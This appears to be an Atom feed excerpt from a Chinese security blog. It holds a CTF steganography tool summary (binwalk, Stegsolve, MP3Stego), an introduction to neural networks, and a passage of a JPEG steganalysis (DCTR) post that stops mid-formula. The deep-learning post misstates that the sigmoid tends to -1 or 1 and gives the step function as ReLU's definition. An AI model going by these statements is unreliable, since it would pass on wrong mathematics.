    <content type="html"><![CDATA[<h2 id="x10-模型介绍">0x10 模型介绍</h2><blockquote><p>STEGA即隐写术，将信息隐藏在多种载体中，如：视频、硬盘和图像，将需要隐藏的信息通过特殊的方式嵌入到载体中，而又不损害载体原来信息的表达。旨在保护需要隐藏的信息不被他人识别。信息隐蔽技术有：1）隐写术、2）数字水印、3）隐蔽信道、4）阀下信道、5）匿名信道 <a id="more"></a> <strong>Simmons模型——囚犯问题</strong></p><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-8ab5199afd99ba54.png" alt="Simmonns模型"><figcaption>Simmonns模型</figcaption></figure></div><p>假设Alice和Bob在两个不同的监狱，他们之间能通过Wendy通信，同时Wendy能获取他们交流的信息，如果Alice和Bob将想要表达的信息隐藏在交流信息中，Wendy就发现不了。</p></blockquote><blockquote><p><strong>Weber定律</strong></p><ul><li>德国生理学家韦伯发现同一刺激差别量必须达到一定比例，才能引起差别感觉：<span class="math inline">\(\frac{\Delta I}{I}=k\)</span>（其中,<code>ΔI</code> 是差别阈限, <code>I</code>是刺激强度,<code>k</code> 是Weber常数）</li><li>感觉量的增加落后于物理量的增加，适用于中等强度的刺激.</li><li><code>ΔI</code> —JND (Just Noticeable Difference)</li></ul></blockquote><blockquote><p><strong>Fechner定律</strong></p><ul><li>心理量是刺激量的对数函数，即当刺激弱度以几何级数增加时，感觉的强度以算术级数增加: <span class="math inline">\(S=k \log I\)</span>（其中, <code>S</code>是感觉强度, <code>I</code>是刺激强度, <code>k</code>是常数）</li><li>这个定律说明了人的一切感觉，包括视觉、听觉、肤觉（含痛、痒、触、温度）、味觉、嗅觉、电击觉等等，都遵从感觉不是与对应物理量的强度成正比，而是与对应物理量的的强度的常用对数成正比的。</li></ul></blockquote><blockquote><p><strong>Watson模型</strong></p><ul><li>Watson提出了一个测量视觉保真度模型,估计了原图像和目标图像之间的JND值。</li><li>基本原理：根据图像块的DCT系数估计变化的感知性,然后将这些估计合并成对感知距离的单个估计。</li><li>过程：1）频率敏感性；2）亮度敏感性；3）对比度敏感性；4）合并,计算总的感知距离</li></ul></blockquote><blockquote><p><strong>听觉感知</strong></p><ul><li>听觉感受到的刺激是：能量、频率。遵从Fechner定律。</li><li>掩蔽效应：频域掩蔽、时域掩蔽</li><li>频域掩蔽阈值：人耳能感知的最低频率成分的声压级。</li><li>绝对听觉阈值：安静环境中,能被人耳感知的纯音最小值。</li></ul></blockquote><blockquote><p><strong>通信隐写模型</strong></p><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-d79f1f36f5b7dc1e.png" alt="通信系统模型"><figcaption>通信系统模型</figcaption></figure></div></blockquote><blockquote><strong>隐写术安全模型</strong><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-8df884a49915ca30.png" alt="隐写术安全模型"><figcaption>隐写术安全模型</figcaption></figure></div></blockquote><blockquote><p><strong>数字水印空间模型</strong></p><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-76f1f85b1b7f9566.png" alt="数字水印空间模型"><figcaption>数字水印空间模型</figcaption></figure></div></blockquote><blockquote><p><strong>典型隐写模型</strong></p><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-0eca908d6392480c.png" alt="典型隐写模型"><figcaption>典型隐写模型</figcaption></figure></div><ul><li><strong>评价隐写术的标准核心标准</strong>：隐蔽程度隐蔽程度越高，直接导致检测有效信息越困难</li><li>其他标准：隐写算法的好坏、隐写手段的复杂度、提取信息的难易度</li></ul></blockquote><blockquote><strong>隐写术分类</strong><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-a87a99cab86f378d.png" alt="隐写术分类"><figcaption>隐写术分类</figcaption></figure></div></blockquote><blockquote><strong>CTF隐写术现状</strong><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-5a169fa1bcb3b2e6.png" alt="CTF隐写术现状"><figcaption>CTF隐写术现状</figcaption></figure></div></blockquote><blockquote><p><strong>LSB隐写介绍</strong></p>一种常见的方式是利用LSB来进行隐写，LSB也就是最低有效位 (Least Significant Bit)。原理就是图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了。譬如我们想把’A’隐藏进来的话，如下图，就可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。<div style="text-align: center;"><figure><img src="https://upload-images.jianshu.io/upload_images/8343187-0347cec0020ba1a2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="红色通道最后一位被修改"><figcaption>红色通道最后一位被修改</figcaption></figure></div><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-87f75058fdf7b8cb.jpg" alt="每个通道都修改最后一位，修改8次就能隐藏一个ASCII码"><figcaption>每个通道都修改最后一位，修改8次就能隐藏一个ASCII码</figcaption></figure></div><p>如果是要寻找这种LSB隐藏痕迹的话，Stegsolv.e是个神器，可以来辅助我们进行分析。 <strong>注：jpg是有损压缩，无法LSB隐藏信息；png虽有压缩却是无损的，bmp没有被压缩，这两者都可用LSB隐藏信息。</strong></p></blockquote><h2 id="x20-工具介绍">0x20 工具介绍</h2><h3 id="binwalk">binwalk</h3><blockquote><p>Binwalk是一个固件的分析工具，多用于逆向工程、取证、隐写分析。 <a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="noopener">更多...</a> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk firmware.bin  //最简单的操作</span><br><span class="line">$ binwalk --<span class="built_in">enable</span>-plugin=zlib firmware.bin  //有些签名无法识别，利用zlib插件扫描zlib压缩包可识别</span><br><span class="line">$ binwalk -y filesystem firmware.bin  //指定字符串“filesystem”搜索(正则)，-Y 输出结果只包含文本字符串</span><br><span class="line">$ binwalk -x filename firmware.bin  //排除搜索结果中指定<span class="string">'filename'</span>字符串(正则)</span><br><span class="line">$ binwalk -y filesystem -x jffs2 firmware.bin  //输出既包含<span class="string">'filesystem'</span>又排除<span class="string">'jffs2'</span>的字符串</span><br><span class="line">$ binwalk --dd=<span class="string">'zip archive:zip:unzip %e'</span> firmware.bin  //&lt;<span class="built_in">type</span>&gt;:&lt;extension&gt;[:&lt;<span class="built_in">command</span>&gt;]. <span class="built_in">type</span> 是签名中描述的小写字符串（支持正则表达式）;extension 是将数据保存到磁盘时使用的文件扩展名;<span class="built_in">command</span> 是当数据已保存到磁盘后可选的命令执行语句</span><br><span class="line">$ binwalk -e firmware.bin  //自动提取</span><br><span class="line">$ binwalk --extract=./my_extract.conf firmware.bin  //自定义提取规则<span class="string">'my_extract.conf'</span></span><br><span class="line">$ binwalk -Me firmware.bin  //递归提取(8层)</span><br><span class="line">$ binwalk -A firmware.bin  //扫描与功能相关联的各种框架操作码</span><br><span class="line">$ binwalk -W firmware1.bin firmware2.bin firmware3.bin  //比较, 在文件当中相同字节的是绿色显示，不同的是红色显示，蓝色表示只是有些文件当中的不同部分</span><br><span class="line">$ binwalk -S firmware.bin  //字符串搜索</span><br><span class="line">$ binwalk -E firmware.bin  //熵分析</span><br><span class="line">$ binwalk -AE firmware.bin  //签名或字符串以及熵分析</span><br><span class="line">$ binwalk --heuristic firmware.bin  //启发式扫描, 加密或压缩的高熵的数据块进行分类</span><br><span class="line">$ binwalk --list-plugins  //插件列表</span><br><span class="line">$ binwalk --<span class="built_in">enable</span>-plugin=foo firmware.bin  //启用插件扫描</span><br><span class="line">$ binwalk --<span class="built_in">disable</span>-plugin=foo firmware.bin  //禁用插件扫描</span><br><span class="line">$ binwalk -f binwalk.log firmware.bin  //日志记录功能</span><br><span class="line">$ sudo binwalk -u  //升级binwalk</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="winhex">WinHex</h3><blockquote><p>Winhex是在Windows下执行的十六进制编辑软件，此软件功能很强大，有完好的分区管理功能和文件管理功能。能自己主动分析分区链和文件簇链。在CTF中一般用来查看文件头格式、直接修改16进制数据，等等。<a href="https://blog.csdn.net/bcbobo21cn/article/details/51187699" target="_blank" rel="noopener">更多...</a></p></blockquote><h3 id="editor">010 Editor</h3><blockquote><p>010 Editor是一款非常强大的文本/十六进制编辑器，除了文本/十六进制编辑外，还包括文件解析、计算器、文件比较等功能，但它真正的强大之处还在于文件的解析功能。我们可以使用010Editor官方网站提供的解析脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p></blockquote><h3 id="stegsolve">Stegsolve</h3><blockquote>Stegsolve是一款图片分析工具，具体功能如下：<div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-1806d57f6405edff.png" alt="功能"><figcaption>功能</figcaption></figure></div></blockquote><h3 id="stegdetect">Stegdetect</h3><blockquote><p>stegdetect是一种数字图像隐写分析工具,主要实现JPEG图像的隐秘信息的嵌入的检测。<a href="http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/" target="_blank" rel="noopener">更多...</a> q – 仅显示可能包含隐藏内容的图像 n – 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。 如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。 s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比， 算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。 d – 打印带行号的调试信息。 t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： j – 检测图像中的信息是否是用jsteg嵌入的。 o – 检测图像中的信息是否是用outguess嵌入的。 p – 检测图像中的信息是否是用jphide嵌入的。 i – 检测图像中的信息是否是用invisible secrets嵌入的。</p></blockquote><h3 id="ffmpeg">ffmpeg</h3><blockquote><p>ffmpeg作为媒体文件处理软件，基本用法: <code>ffmpeg -i INPUTfile [OPTIONS] OUTPUTfile</code> 输入输出文件通常就是待处理的多媒体文件了。可以是纯粹的音频文件，纯粹的视频文件，或者混合的。ffmpeg支持绝大部分的常见音频,视频格式，像常见的mpeg,AVI封装的DIVX和Xvid等等，具体的格式支持列表可以使用ffmpeg -formats查看或直接查阅文档。<a href="http://www.ffmpeg.org/documentation.html" target="_blank" rel="noopener">更多...</a></p></blockquote><h3 id="msu-stego">MSU Stego</h3><blockquote><p>用于对 AVI 文件进行隐写. 官方介绍如下： MSU StegoVideo allows hiding any file in a video sequence.Different popular codecs were analyzed and an algorithm, providing the smallest data loss after compression, was chosen. Convolutional codes with Viterbi decoding are used to correct occurred errors. <a href="http://www.compression.ru/video/stego_video/index_en.html" target="_blank" rel="noopener">更多...</a> <strong>Main features</strong> Small video distortions after hiding info. It is possible to extract info after video compression. Information is protected with passcode.</p><div style="text-align: center;"><p><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-8a6b942040f6bbc0.png"></p></div></blockquote><h3 id="qr-reader">QR Reader</h3><blockquote><p>二维码扫描工具可自定义参数，可以自动识别二维码反色，自动识别电脑屏幕二维码，识别率比手机扫码高，非常强大。</p><div style="text-align: center;"><p><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-f3a4f19063cc473e.png"></p></div></blockquote><h3 id="mp3stego">MP3Stego</h3><blockquote><p>用于对 MP3 音频文件进行隐写、提取等操作。<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">更多...</a> 用法： encode -E <a href="http://www.petitcolas.net/steganography/mp3stego/hidden_text.txt" target="_blank" rel="noopener">hidden_text.txt</a> -P pass <a href="http://www.petitcolas.net/steganography/mp3stego/svega.wav" target="_blank" rel="noopener">svega.wav</a> <a href="http://www.petitcolas.net/steganography/mp3stego/svega_stego.mp3" target="_blank" rel="noopener">svega_stego.mp3</a> decode -X -P pass svega_stego.mp3</p></blockquote><h2 id="x30-其他格式">0x30 其他格式</h2><h3 id="x31-文件格式概述">0x31 文件格式概述</h3><blockquote><ul><li>文本格式：.pdf、.txt、.doc、.docx</li><li>图像格式：.png、.jpg、.bmp、.gif</li><li>音频格式：.mp3、.wma、.wav</li><li>视频格式：.mp4、.rmvb、.avi、.flv</li></ul></blockquote><h3 id="x32-pdf文件格式">0x32 pdf文件格式</h3><blockquote><a href="https://lazymind.me/2017/10/pdf-structure/" target="_blank" rel="noopener">更多...</a> <strong>数据类型</strong> - 对象, 一个PDF文档是由一个由基本数据类型组成的数据结构。<br>- 文件（物理结构）, 决定对象是如何存放在一个PDF文件中的， 它们是如何被访问的，如何被更新的。这个结构是独立于对象的语义的。<br>- 文档结构, 说明一些基本的对象类型是如何来表现PDF文档的成分的：页，字体，批注，和另外一些内容。<br>- 内容流.一个PDF文件内容流包含一系列的指令，描述页面的外观或其他图形实体的外观和文件内容。<div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-b072928996c6da45.png" alt="pdf文件结构"><figcaption>pdf文件结构</figcaption></figure></div><div style="text-align: center;"><figure><img src="/2019/06/06/隐写术(四)--CTF总结/8343187-e40d89ab964926b8.png" alt="数据流读写过程"><figcaption>数据流读写过程</figcaption></figure></div></blockquote><p><strong><em>持续更新中...</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x10-模型介绍&quot;&gt;0x10 模型介绍&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;STEGA即隐写术，将信息隐藏在多种载体中，如：视频、硬盘和图像，将需要隐藏的信息通过特殊的方式嵌入到载体中，而又不损害载体原来信息的表达。旨在保护需要隐藏的信息不被他人识别。信息隐蔽技术有：1）隐写术、2）数字水印、3）隐蔽信道、4）阀下信道、5）匿名信道&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="MISC" scheme="http://www.killshadow.xyz/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>深度学习理论基础</title>
    <link href="http://www.killshadow.xyz/2019/06/04/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"/>
    <id>http://www.killshadow.xyz/2019/06/04/深度学习理论基础/</id>
    <published>2019-06-03T16:00:00.000Z</published>
    <updated>2019-06-04T06:02:59.656Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-神经网络简介">0x00 神经网络简介</h2><p>神经网络最早能追溯到上世纪40年代的MP模型，而上世纪80年代的误差反向传播算法（BP算法），神经网络得以进一步发展，研究者开始增加网络层实现非线性功能，但由于那时计算机的计算能力非常弱，其发展一度陷入了停滞。<a id="more"></a>直到2006年，Hinton提出深度信念网络（DBN），由于当时计算机计算能力有所提升，该算法能够提供更好的策略来训练模型，深度学习迎来新的生机。在图像识别领域，深度学习方法的引入打破了传统模式识别方法识别效能的瓶颈。2012年ImageNet比赛，冠军是基于CNN网络的模型AlexNet，而基于SVM方法的模型却夺得亚军。这场比赛的结果昭示了神经网络在图像识别领域的巨大前景，也揭开了深度图像识别新的研究方向。下面会介绍神经网络的基本结构，并概括分析现有的深度学习网络。</p><hr><h2 id="x10-神经网络基本概念">0x10 神经网络基本概念</h2><h3 id="x11-神经元">0x11 神经元</h3><p>正如生物学中的概念，计算机科学中神经网络的神经元是最基本的构件。它的功能跟人的神经元类似，即：给定一些输入给神经元，它会产生输出。从数学的角度出发，神经元就是一个数学函数，它能根据输入结合函数的性质，计算出结果并输出。如图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559625636601.png" alt="神经元示意图"><figcaption>神经元示意图</figcaption></figure></div><p>不同神经元由不同的函数构成，这些函数在术语上称为激活函数。下面会介绍几种常见的激活函数。</p><h3 id="x12-激活函数">0x12 激活函数</h3><h4 id="阶跃函数">阶跃函数</h4><p>阶跃函数的定义如下： <span class="math display">\[f(x)=\left\{\begin{array}{ll}{0} &amp; {\text { for } x&lt;0} \\ {1} &amp; {\text { for } x \geq 0}\end{array}\right.\tag{1}\]</span> 其函数图如下图:</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559625749773.png" alt="阶跃函数"><figcaption>阶跃函数</figcaption></figure></div><p>​ 根据公式<span class="math inline">\((1)\)</span>可知，如果x的值大于或等于0，输出为1；否则，输出为0。由图4.2可知阶跃函数在零点是不可微的。而梯度下降法常用于神经网络反向传播模型中，其思想是多变量微分寻找极值点，所以梯度下降法不能利用阶跃函数微分，所以研究者需要找到一个能够可微的替代函数，Sigmoid函数由此产生。</p><h4 id="sigmoid函数">Sigmoid函数</h4><p>Sigmoid函数定义如下： <span class="math display">\[f(x)=\sigma(x)=\frac{1}{1+e^{-x}}\tag{2}\]</span> 其函数图如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559626121069.png" alt="Sigmoid函数"><figcaption>Sigmoid函数</figcaption></figure></div><p>​ 根据公式<span class="math inline">\((2)\)</span>可知，当自变量z趋于负无穷或正无穷时，函数的值趋于-1或1。它是有界可微函数，并且在函数的每个点都有一个正导数。由于其可微性，通常被用于反向传播模型中的梯度下降法中。</p><h4 id="tanh函数">Tanh函数</h4><p>Tanh函数定义如下： <span class="math display">\[\tanh x=\frac{\sinh x}{\cosh x}=\frac{e^{x}-e^{-x}}{e^{x}+e^{-x}}\tag{3}\]</span> 其函数图如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559625924986.png" alt="Tanh函数"><figcaption>Tanh函数</figcaption></figure></div><p>​ 由公式<span class="math inline">\((3)\)</span>可知，Tanh函数其实就是Sigmoid函数因变量的取值范围从<span class="math inline">\([0,1]\)</span>变成<span class="math inline">\([-1,1]\)</span>，它是一个基本的双曲函数。如Sigmoid函数，Tanh函数是可微的、单调递增的函数。与Sigmoid函数不同的是：当输入为负数时，<span class="math inline">\(\tanh\ x\)</span>值为负数；输入为0时，<span class="math inline">\(\tanh\ x\)</span>值为0。所以Tanh函数常用于分类器中。</p><h4 id="relu函数">ReLU函数</h4><p>ReLU函数定义如下： <span class="math display">\[f(x)=\left\{\begin{array}{ll}{0} &amp; {\text { for } x&lt;0} \\ {1} &amp; {\text { for } x \geq 0}\end{array}\right. \ or \ \mathrm{R}(x)=\max (0, \mathrm{x})\tag{4}\]</span> 其函数图如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559626421800.png" alt="ReLU函数"><figcaption>ReLU函数</figcaption></figure></div><p>​ 由公式<span class="math inline">\((4)\)</span>可知，ReLU自变量小于0时因变量恒为0，大于0时自变量等于因变量。ReLU是目前研究中，使用最频繁的激活函数，它通常被用在CNN或DL（Deep Learning）中。</p><p>下图显示了比较常用的激活函数：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559626462080.png" alt="激活函数表"><figcaption>激活函数表</figcaption></figure></div><h3 id="x13-神经网络">0x13 神经网络</h3><p>前面介绍的神经元和激活函数是神经网络的基本构建，而一个神经网络由多个神经元构成，如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559626563175.png" alt="多层神经网络"><figcaption>多层神经网络</figcaption></figure></div><p>​ 如上图，最左边的一层为输入层（Input Layer），这一层接收来自外界的输入，并将信号传递给下一层——Layer1，随后以此传递给Layer2-4，最后到达最右边的输出层（Output Layer）。而中间的Layer1-4我们把它们成为隐藏层（Hidden Layers），其中的数据无法在神经网络训练时观测到。上图中灰色的、独立于以上各层的单元叫做偏置单元（Bias Unit），具有调整函数信号传递的作用，从数学角度考虑，它是函数的截距。如函数 ，其中的n就是当 时的截距。网络层之间的信号也可以通过权值来调整。值得注意的是，隐藏层中的每一层的激活函数都可以有所不同，而神经网络的多样性正是由于神经网络中隐藏层的激活函数、网络层的权值、层数等的多样性而产生的。</p><h2 id="x20-卷积神经网络cnn">0x20 卷积神经网络（CNN）</h2><p>在神经网络中，卷积神经网络（CNN）是图像识别、图像分类重要分网络之一，对象检测、人脸识别等等都有CNN的影子。计算机将输入的图像视为像素阵列，然后根据图像分辨率（<span class="math inline">\(H \times W \times D\)</span>，其中H为高度，W为宽度，D为尺寸）生成不同的阵列图，如RGB彩色图像可生成为<span class="math inline">\(6\times6\times3\)</span>（R，G，B各占一个尺寸）阵列或者<span class="math inline">\(4\times4\times1\)</span>灰度图像阵列。</p><p>从CNN的过程来看，每个输入的图像通过滤波、池化、全连接等的处理，最后为了将这个神经网络输出的值量化成<span class="math inline">\([0,1]\)</span>区间的概率值进行分类，引入了Softmax函数。下图是用CNN分类车辆图像的完整流程：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559626957131.png" alt="使用多层神经网络分类车辆图像"><figcaption>使用多层神经网络分类车辆图像</figcaption></figure></div><h3 id="x21-卷积层">0x21 卷积层</h3><p>在上图中的卷积层（Convolution Layer）是从输入图像中提取特征的第一层，实际上就是图像矩阵与卷积核或滤波器的卷积，这其实是一个数学计算过程。假设有一个5x5、像素值为0，1的图像与一个3x3的滤波器矩阵卷积，步长为1，如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559627129492.png" alt="图像矩阵与滤波器矩阵卷积"><figcaption>图像矩阵与滤波器矩阵卷积</figcaption></figure></div><p>​ 其卷积的过程如下图（图中的步骤不连续）：</p><div style="text-align: center;"><p><img src="/2019/06/04/深度学习理论基础/1559627181148.png" alt="卷积过程1"> <img src="/2019/06/04/深度学习理论基础/1559627189653.png" alt="卷积过程2"> <img src="/2019/06/04/深度学习理论基础/1559627199494.png" alt="卷积过程3"></p></div><p>​ 通过这一步骤，我们便可得到图像滤波后的特征，当然这只是简单的案例，真实的图像远比这种情复杂，需要考虑图像通道、图像分辨率、填充（Padding）方式、卷积核的设定等等。</p><h3 id="x22-池化层">0x22 池化层</h3><p>池化层（也称为子采样或下采样）的作用是压缩卷积后产生的特征图的尺寸，它降低了每个特征的维度，但保留了更为重要的特征，池化层的类型可以是不同的，如：最大池化是选取特征矩阵中的最大值作为新的特征图；平均池化是取特征矩阵各个区域的平均值作为新的特征图；LP池化则通过取出特征矩阵各个区域中位数来计算特征图。如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559627290843.png" alt="池化层的三种类型"><figcaption>池化层的三种类型</figcaption></figure></div><p>当然，池化层的类型绝不仅仅是以上三种，对于特殊用途的CNN有特殊的池化方式。</p><h3 id="x23-全连接层">0x23 全连接层</h3><p>全连接层的作用是将来自卷积层或池化层输出的二维特征图降维。跟多层感知器一样，全连接层需要激活函数计算各个单元的输出值。虽然池化层与全连接层都有降维的目的，但与池化层不同的是，全连接层致力于把二维的特征矩阵转化为特征向量，如下图：</p><div style="text-align: center;"><figure><img src="/2019/06/04/深度学习理论基础/1559627330156.png" alt="全连接层的输入与输出"><figcaption>全连接层的输入与输出</figcaption></figure></div><hr><h2 id="x30-本章小结">0x30 本章小结</h2><p>​ 本章重点介绍了神经网络的基础概念以及在数字图像处理较为常用的卷积神经网络，为下文降维融合的方法提供理论说明。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-神经网络简介&quot;&gt;0x00 神经网络简介&lt;/h2&gt;
&lt;p&gt;神经网络最早能追溯到上世纪40年代的MP模型，而上世纪80年代的误差反向传播算法（BP算法），神经网络得以进一步发展，研究者开始增加网络层实现非线性功能，但由于那时计算机的计算能力非常弱，其发展一度陷入了停滞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Deep Learning" scheme="http://www.killshadow.xyz/tags/Deep-Learning/"/>
    
  </entry>
  
  <entry>
    <title>隐写术(三)--JPEG隐写分析特征算法与理论</title>
    <link href="http://www.killshadow.xyz/2019/05/29/%E9%9A%90%E5%86%99%E6%9C%AF(%E4%B8%89)--JPEG%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90%E7%89%B9%E5%BE%81%E7%AE%97%E6%B3%95%E4%B8%8E%E7%90%86%E8%AE%BA/"/>
    <id>http://www.killshadow.xyz/2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/</id>
    <published>2019-05-29T12:28:00.000Z</published>
    <updated>2019-06-06T03:05:39.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-前言">0x00 前言</h2><blockquote>前面介绍的内容着重于阐述传统的数字图像隐写算法，实际上与图像隐写对立的数字图像隐写分析，而这一方向也随着图像隐写的发展而发展，形成一种对抗的博弈。数字图像隐写分析分类如下图所示:<a id="more"></a><div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/8343187-9cfd3b1c3aa58b1b.png" alt="隐写分析算法分类"><figcaption>隐写分析算法分类</figcaption></figure></div></blockquote><p>​ 下面会介绍三个重要的隐写分析算法以展开隐写分析的研究，而这三个算法属于通用盲检测算法范畴，此类算法根据JPEG图像的像素点或者DCT系数的特性，提取出JPEG图像的共生矩和直方图特征，利用这些特征作为分类器的输入，分类器根据这些特征训练可得到检测器，以检测图片是否嵌入了秘密信息。</p><blockquote><p>若hexo解析公式不正常, <a href="https://www.jianshu.com/p/e75b4baa93f1" target="_blank" rel="noopener">请转移到简书看</a></p></blockquote><hr><h2 id="x10-残差图像的离散余弦变换">0x10 残差图像的离散余弦变换</h2><p>残差图像的离散余弦变换（DCTR）[1]是通用的盲检测算法。该算法用JPEG中的DCT基来获得残差直方图，因此特征提取只需要计算64个8x8核DCT基，利用这些卷积核与解压JPEG图像卷积得到一个二维矩阵，然后将这个二维矩阵量化、截断得到子图像，最后根据这些子图像提取出直方图特征，再将这些直方图特征通过对称性原则对其进一步压缩，融合成8000维的特征向量。DCTR较于一般的通用盲检测算法，最大的优势在于效率非常高，提取出的特征的维数也相对较低，本小节将详细解释DCTR的每个步骤。</p><p>给定一个像素为 <span class="math inline">\(M × N\)</span>（M,N均为8的倍数）的灰度图像，<span class="math inline">\(\mathrm{X} \in \mathrm{R}^{\mathrm{M} \times \mathrm{N}}\)</span>, 64个<span class="math inline">\(8 × 8\)</span>非抽取的DCT基定义为<span class="math inline">\(B^{(k,l)}\)</span>，则有： <span class="math display">\[\begin{split}\mathrm{U}^{(\mathrm{k}, \mathrm{I})}&amp;=\mathrm{X} \star \mathrm{B}^{(\mathrm{k} 1)}\\\,{u(\mathrm{X})}&amp;=\mathrm{U}^{(\mathrm{k}, 1)} | 0 \leq \mathrm{k}, 1 \leq 7\end{split}\tag{1}\]</span></p><p>其中，<span class="math inline">\(\mathrm{U}^{(\mathrm{k}, 1)} \in \mathrm{R}^{(\mathrm{M}-\overline{7}) \times(\mathrm{N}-7)}\)</span>，“<span class="math inline">\(\star\)</span>”表示无填充卷积。为提高可读性，定义<span class="math inline">\(i,j\)</span>和<span class="math inline">\(k,l\)</span>为DCT模型下空域的索引，即像素点的下标，他们的取值范围为<span class="math inline">\({i, j, k, l \in[0,7]}\)</span>。经过上面这一步，我们会得到多个 的矩阵，下面我们会看到未抽样DCT的值<span class="math inline">\(u(X)\)</span>是如何受<span class="math inline">\(X\)</span>的单个DCT系数细微的改变而发生巨大的影响的。</p><p>假设二次采样后每<span class="math inline">\(8 × 8\)</span>的矩阵为<span class="math inline">\(\mathrm{U}^{(\mathrm{i}, \mathrm{j})}=\mathrm{X} \star \mathrm{B}^{(\mathrm{i}, \mathrm{j})}\)</span>，这些矩阵的四个顶点为： <span class="math display">\[\begin{equation}\mathcal{G}_{8 \times 8}=\{0,7,15, \ldots, \mathrm{M}-9\} \times\{0,7,15, \ldots, \mathrm{N}-9\}\end{equation}\tag{2}\]</span></p><p><span class="math inline">\((m, n) \in \mathcal{G}_{8\times 8}\)</span>是对应的JPEG图像上的一个修改的系数，这个系数存在于<span class="math inline">\((k,l)\)</span>矩阵中。<span class="math inline">\((m,n)\)</span>位置上DCT系数的变化将影响一整块<span class="math inline">\(8 × 8\)</span>矩阵中的所有像素，以及在<span class="math inline">\(\mathbf{U}^{(\mathbf{i}, \mathbf{j})}\)</span>中以<span class="math inline">\((m, n) \in \mathcal{G}_{8 \times 8}\)</span>这个点为中心的整个15 × 15的领域。特别地，这些值的修改有下面的“单元响应” <span class="math inline">\(\mathbf{R}^{(\mathbf{i}, \mathbf{j})(\mathbf{k}, \mathbf{l})}\)</span>来完成： <span class="math display">\[\mathrm{R}^{(\mathrm{i}, \mathrm{j})(\mathrm{k}, 1)}=\mathrm{B}^{(\mathrm{i}, \mathrm{j})} \otimes \mathrm{B}^{(\mathrm{k}, 1)}\tag{3}\]</span> 由公式<span class="math inline">\((3)\)</span>假设我们已知某个二次采样后的<span class="math inline">\(8 × 8\)</span>矩阵的四个顶点分别定义为：A、B、C、D，对于一个特定的值<span class="math inline">\(u \in \mathrm{U}^{(\mathrm{i}, \mathrm{j})}\)</span>，即<span class="math inline">\(u\)</span>为<span class="math inline">\(8 × 8\)</span>矩阵中的其中一个元素，它的位置为<span class="math inline">\((a,b)\)</span>，<span class="math inline">\(a, b \in [0,7]\)</span>. 我们以8x8左上角的顶点为参照点，则其他B-D的点分别为：<span class="math inline">\((a,b-8), (a-8,b), 